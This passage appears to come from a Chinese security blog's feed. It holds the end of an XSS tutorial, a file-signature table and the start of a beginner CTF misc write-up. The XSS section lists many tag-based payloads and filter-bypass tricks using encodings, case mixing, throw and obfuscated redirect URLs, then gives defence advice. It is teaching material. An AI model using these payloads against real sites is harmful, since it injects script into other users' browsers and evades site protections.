class="line">&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><code>img</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><p><code>input</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot;&gt;</span><br><span class="line">竞争焦点，从而触发onblur事件</span><br><span class="line">&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;</span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot; autofocus&gt;</span><br></pre></td></tr></table></figure><p><code>details</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt;</span><br><span class="line">使用open属性触发ontoggle事件，无需用户去触发</span><br><span class="line">&lt;details open ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>svg</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><p><code>select</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;select onfocus=alert(1) autofocus&gt;</span><br></pre></td></tr></table></figure><p><code>iframe</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><code>video</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>audio</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><p><code>body</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><p>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body</span><br><span class="line">onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure><p><code>textarea</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</span><br></pre></td></tr></table></figure><p><code>keygen</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</span><br></pre></td></tr></table></figure><p><code>marquee</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></table></figure><p><code>isindex</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</span><br></pre></td></tr></table></figure><h3 id="利用link远程包含js文件"><a href="#利用link远程包含js文件" class="headerlink" title="利用link远程包含js文件"></a>利用link远程包含js文件</h3><p><strong>PS：在无CSP的情况下才可以</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h3><p><code>&lt;a&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;iframe&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(&apos;xss&apos;)&gt;//IE7以下</span><br></pre></td></tr></table></figure><p><code>&lt;form&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>expression属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img style=&quot;xss:expression(alert(&apos;xss&apos;&apos;))&quot;&gt; // IE7以下</span><br><span class="line">&lt;div style=&quot;color:rgb(&apos;&apos;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下</span><br><span class="line">&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7以下</span><br></pre></td></tr></table></figure><p>background属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</span><br></pre></td></tr></table></figure><h1 id="有过滤的情况下"><a href="#有过滤的情况下" class="headerlink" title="有过滤的情况下"></a>有过滤的情况下</h1><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>用<code>/</code>代替空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><h3 id="双写关键字"><a href="#双写关键字" class="headerlink" title="双写关键字"></a>双写关键字</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><p>利用eval</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&apos;(`xss`);&apos;;eval(a+b+c)&quot;&gt;</span><br></pre></td></tr></table></figure><p>利用top</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="其它字符混淆"><a href="#其它字符混淆" class="headerlink" title="其它字符混淆"></a>其它字符混淆</h3><p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可利用注释、标签的优先级等</span><br><span class="line">1.&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;</span><br><span class="line">2.&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(`xss`);&quot;&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line">3.&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p><code>Unicode编码绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&apos;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>url编码绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&apos;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><code>Ascii码绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>hex绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=eval(&apos;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&apos;)&gt;</span><br></pre></td></tr></table></figure><p><code>八进制</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(&apos;\170\163\163&apos;)&gt;</span><br></pre></td></tr></table></figure><p><code>base64绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="过滤双引号，单引号"><a href="#过滤双引号，单引号" class="headerlink" title="过滤双引号，单引号"></a>过滤双引号，单引号</h2><p>1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=alert(`xss`);&gt;</span><br></pre></td></tr></table></figure><p>2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了</p><h2 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h2><p>当括号被过滤的时候可以使用throw来绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h2><h3 id="使用url编码"><a href="#使用url编码" class="headerlink" title="使用url编码"></a>使用url编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`&gt;</span><br></pre></td></tr></table></figure><h3 id="使用IP"><a href="#使用IP" class="headerlink" title="使用IP"></a>使用IP</h3><p><code>1.十进制IP</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;</span><br></pre></td></tr></table></figure><p><code>2.八进制IP</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt;</span><br></pre></td></tr></table></figure><p><code>3.hex</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;</span><br></pre></td></tr></table></figure><p>4.html标签中用<code>//</code>可以代替<code>http://</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;</span><br></pre></td></tr></table></figure><p>5.使用<code>\\</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议</span><br></pre></td></tr></table></figure><p>Windows下<br><img src="/images/94-1.gif" alt></p><p>Linux下<img src="/images/94-2.gif" alt><br>6.使用中文逗号代替英文逗号<br>如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.location=`http://www。baidu。com`&quot;&gt;//会自动跳转到百度</span><br></pre></td></tr></table></figure><h1 id="如何防止xss"><a href="#如何防止xss" class="headerlink" title="如何防止xss"></a>如何防止xss</h1><ul><li>过滤一些危险字符，以及转义<code>&amp; &lt; &gt; &quot; &#39; /</code>等危险字符</li><li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此Cookie。</li><li>设置CSP(Content Security Policy)</li><li>输入内容长度限制</li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>感觉总结的不是很全面，以后会查漏补缺，如果有师傅发现错误之处，还望斧正</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://html5sec.org/" target="_blank" rel="noopener">https://html5sec.org/</a><br><a href="https://blog.csdn.net/qq_29277155/article/details/51320064" target="_blank" rel="noopener">很全的xss总结</a><br><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h1&gt;&lt;p&gt;XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XSS" scheme="https://muzibing.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>各种文件的文件头和文件尾总结</title>
    <link href="https://muzibing.github.io/2020/02/09/2020.02.09%EF%BC%8892%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/02/09/2020.02.09（92）/</id>
    <published>2020-02-08T16:00:00.000Z</published>
    <updated>2020-02-09T08:51:27.251Z</updated>
    
    <content type="html"><![CDATA[<div class="table-container"><table><thead><tr><th style="text-align:center">文件类型</th><th style="text-align:center">文件头</th><th style="text-align:center">文件尾</th></tr></thead><tbody><tr><td style="text-align:center"><strong><font color="brown">JPEG</font></strong></td><td style="text-align:center">FFD8FF</td><td style="text-align:center">FF D9</td></tr><tr><td style="text-align:center"><strong><font color="brown">PNG (png)</font></strong></td><td style="text-align:center">89504E47</td><td style="text-align:center">AE 42 60 82</td></tr><tr><td style="text-align:center"><strong><font color="brown">GIF (gif)</font></strong></td><td style="text-align:center">47494638</td><td style="text-align:center">00 3B</td></tr><tr><td style="text-align:center"><strong><font color="brown">ZIP Archive (zip)</font></strong></td><td style="text-align:center">504B0304</td><td style="text-align:center">50 4B</td></tr><tr><td style="text-align:center"><strong><font color="brown">TIFF (tif)</font></strong></td><td style="text-align:center">49492A00</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Windows Bitmap (bmp)</td><td style="text-align:center">424D</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">CAD (dwg)</td><td style="text-align:center">41433130</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Adobe Photoshop (psd)</td><td style="text-align:center">38425053</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Rich Text Format (rtf)</td><td style="text-align:center">7B5C727466</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="navy">XML (xml)</font></strong></td><td style="text-align:center">3C3F786D6C</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="navy">HTML (html)</font></strong></td><td style="text-align:center">68746D6C3E</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">Winhex：3C 21 44 4F 43 54 59 50 45 20 68 74 6D 6C 3E</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">Email [thorough only] (eml)</td><td style="text-align:center">44656C69766572792D646174653A</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Outlook Express (dbx)</td><td style="text-align:center">CFAD12FEC5FD746F</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Outlook (pst)</td><td style="text-align:center">2142444E</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="navy">MS Word/Excel (xls.or.doc)</font></strong></td><td style="text-align:center">D0CF11E0</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">MS Access (mdb)</td><td style="text-align:center">5374616E64617264204A</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">WordPerfect (wpd)</td><td style="text-align:center">FF575043</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="navy">Adobe Acrobat (pdf)</font></strong></td><td style="text-align:center">255044462D312E</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Quicken (qdf)</td><td style="text-align:center">AC9EBD8F</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Windows Password (pwl)</td><td style="text-align:center">E3828596</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">RAR Archive (rar)</td><td style="text-align:center">52617221</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="brown">Wave (wav)</font></strong></td><td style="text-align:center">57415645</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="brown">AVI (avi)</font></strong></td><td style="text-align:center">41564920</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Real Audio (ram)</td><td style="text-align:center">2E7261FD</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Real Media (rm)</td><td style="text-align:center">2E524D46</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="brown">Quicktime (mov)</font></strong></td><td style="text-align:center">6D6F6F76</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Windows Media (asf)</td><td style="text-align:center">3026B2758E66CF11</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">MIDI (mid)</td><td style="text-align:center">4D546864</td><td style="text-align:center">——</td></tr></tbody></table></div><p>附件：<a href="http://pan.baidu.com/s/1c3raQM" target="_blank" rel="noopener">文件格式分析器</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;div class=&quot;table-container&quot;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;文件类型&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;文件头&lt;/th&gt;
&lt;th style=
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>【WP】XCFT misc新手阶段</title>
    <link href="https://muzibing.github.io/2020/01/30/2020.01.30%EF%BC%8891%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/01/30/2020.01.30（91）/</id>
    <published>2020-01-29T16:00:00.000Z</published>
    <updated>2020-02-09T08:10:32.893Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、PDF"><a href="#一、PDF" class="headerlink" title="一、PDF"></a><font color="brown">一、PDF</font></h3><h4 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a><font color="navy">1.基础知识</font></h4><blockquote><p>无</p></blockquote><h4 id="2-题目要求"><a href="#2-题目要求" class="headerlink" title="2.题目要求"></a><font color="navy">2.题目要求</font></h4><p><img src="/images/91-1.jpg" alt></p><h4 id="3-做题步骤"><a href="#3-做题步骤" class="headerlink" title="3.做题步骤"></a><font color="navy">3.做题步骤</font></h4><blockquote><p>直接 pdf 转换为 word （<a href="https://lightpdf.com/pdf-to-word" target="_blank" rel="noopener">转换工具点击这里</a>），然后将 word 中的图片进行移动，会发现图片下的 flag。</p></blockquote><h3 id="二、如来十三掌"><a href="#二、如来十三掌" class="headerlink" title="二、如来十三掌"></a><font color="brown">二、如来十三掌</font></h3><h4 id="1-基础知识-1"><a href="#1-基础知识-1" class="headerlink" title="1.基础知识"></a><font color="navy">1.基础知识</font></h4><blockquote><ol><li><strong>与佛论禅</strong>算法的原理和本质</li><li>ROT-13 加密解密：其本质就是凯撒密码的密钥为 13 （平移13个字符）</li></ol></blockquote><h4 id="2-题目要求-1"><a href="#2-题目要求-1" class="headerlink" title="2.题目要求"></a><font color="navy">2.题目要求</font></h4><p><img src="/images/91-2.png" alt></p><h4 id="3-做题步骤-1"><a href="#3-做题步骤-1" class="headerlink" title="3.做题步骤"></a><font color="navy">3.做题步骤</font></h4><blockquote><ol><li><p>下载附件，得到一个 word 文件，打开该文档，发现里面的内容如下：</p><p><img src="/images/91-3.jpg" alt></p></li><li><p>将文字放到“与佛论禅”破解网站里面进行翻译，如下图：</p><p><img src="/images/91-4.jpg" alt></p></li><li><p>根据题目“如来十三掌”的题目提示，我们用 rot-13 进行解密，脚本代码如下：</p><p><img src="/images/91-5.jpg" alt></p></li><li><p>运行脚本，得到对应的密文：</p><p><img src="/images/91-6.jpg" alt></p></li><li><p>但是我们从得到的结果中不能得到什么结果，查了查，发现还要经过 base64 解码后才能得到 flag：</p><p><img src="/images/91-7.jpg" alt></p></li></ol></blockquote><h3 id="三、give-you-flag"><a href="#三、give-you-flag" class="headerlink" title="三、give you flag"></a><font color="brown">三、give you flag</font></h3><h4 id="1-基础知识-2"><a href="#1-基础知识-2" class="headerlink" title="1.基础知识"></a><font color="navy">1.基础知识</font></h4><blockquote><font color="orange">二维码的原理</font><ul><li><a href="http://blog.sae.sina.com.cn/archives/1139" target="_blank" rel="noopener">http://blog.sae.sina.com.cn/archives/1139</a></li><li><a href="https://blog.csdn.net/weiwei9363/article/details/81112795" target="_blank" rel="noopener">https://blog.csdn.net/weiwei9363/article/details/81112795</a></li><li><a href="https://blog.csdn.net/u012611878/article/details/53167009" target="_blank" rel="noopener">https://blog.csdn.net/u012611878/article/details/53167009</a></li></ul></blockquote><h4 id="2-题目要求-2"><a href="#2-题目要求-2" class="headerlink" title="2.题目要求"></a><font color="navy">2.题目要求</font></h4><p><img src="/images/91-8.jpg" alt></p><h4 id="3-做题步骤-2"><a href="#3-做题步骤-2" class="headerlink" title="3.做题步骤"></a><font color="navy">3.做题步骤</font></h4><blockquote><ol><li><p>下载并打开附件，发现是一张格式为 gif 的图片，在图片最后会看到一个类似于二维码的图片，但是出现的时间太短了，无法截图</p><p><img src="/images/91-9.jpg" alt></p></li><li><p>那怎么办呢？一个字，“干”就完事了！写脚本，将这个 gif 动图一帧一帧的分离出来，说写咱就写！</p><p><img src="/images/91-10.jpg" alt></p></li><li><p>运行脚本就能得到 gif 每一帧的图片，其中红框标的的图片（名字为 49.jpg）的就是我们要得到的图片</p><p><img src="/images/91-11.jpg" alt></p></li><li><p>打开图片后，发现这并不是一个完整的二维码，那么这里就需要<font color="navy">“基础知识”</font>中所给连接的知识了。在查过相关资料后，发现得到的“残二维码”缺少三个定位图形，下面用 PS 将这三个定位图形加上，得到如下的图片：</p><p><img src="/images/91-12.png" alt></p></li><li><p>打开微信扫描二维码，得到 flag</p></li></ol></blockquote><h3 id="四、坚持-60-s"><a href="#四、坚持-60-s" class="headerlink" title="四、坚持 60 s"></a><font color="brown">四、坚持 60 s</font></h3><h4 id="1-基础知识-3"><a href="#1-基础知识-3" class="headerlink" title="1.基础知识"></a><font color="navy">1.基础知识</font></h4><blockquote><p><strong>java 的逆向</strong>：JD — GUI</p></blockquote><h4 id="2-题目要求-3"><a href="#2-题目要求-3" class="headerlink" title="2.题目要求"></a><font color="navy">2.题目要求</font></h4><p><img src="/images/91-13.jpg" alt></p><h4 id="3-做题步骤-3"><a href="#3-做题步骤-3" class="headerlink" title="3.做题步骤"></a><font color="navy">3.做题步骤</font></h4><blockquote><ol><li><p>下载附件，发现是一个 java 程序包，运行该程序（前提电脑要有 java 运行环境），如下图：</p><p><img src="/images/91-14.jpg" alt></p></li><li><p>开始玩这个游戏，发现自己怎么也坚持不住 60s，无奈只能对该程序进行逆向（我用的是 JD - GUI），在逆向的结果中搜索“flag”，发现在“PlaneGameFrame.class”中有该结果，于是打开该文件，得到如下结果：</p><p><img src="/images/91-15.jpg" alt></p></li><li><p>发现 flag 中的好像进行了 base64 加密，于是用 python 进行解密，如下：</p><p><img src="/images/91-16.jpg" alt></p></li><li><p>提交 flag ，回答正确。</p></li></ol></blockquote><h3 id="五、gif"><a href="#五、gif" class="headerlink" title="五、gif"></a><font color="brown">五、gif</font></h3><h4 id="1-基础知识-4"><a href="#1-基础知识-4" class="headerlink" title="1.基础知识"></a><font color="navy">1.基础知识</font></h4><blockquote><p><strong>python 的 <a href="https://www.runoob.com/python/os-file-methods.html" target="_blank" rel="noopener">os</a> 和 <a href="https://pillow.readthedocs.io/en/stable/" target="_blank" rel="noopener">Pillow</a> 模块</strong></p></blockquote><h4 id="2-题目要求-4"><a href="#2-题目要求-4" class="headerlink" title="2.题目要求"></a><font 